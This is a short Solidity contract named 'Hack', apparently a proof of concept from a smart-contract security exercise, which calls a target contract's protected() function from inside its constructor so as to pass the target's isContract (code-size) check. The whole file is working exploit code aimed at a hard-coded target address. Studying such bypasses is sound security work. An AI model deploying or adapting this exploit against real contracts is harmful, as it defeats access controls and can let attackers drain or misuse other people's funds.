// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface ITarget {
    function isContract(address account) external view returns (bool);
    function protected() external;
}

contract Hack {

    bool public isContract;

    constructor() {
        address target = 0x68821fE155785483a9c85ae6F5BD04D210eE0b07;
        isContract = ITarget(target).isContract(address(this));
        ITarget(target).protected();
    }
}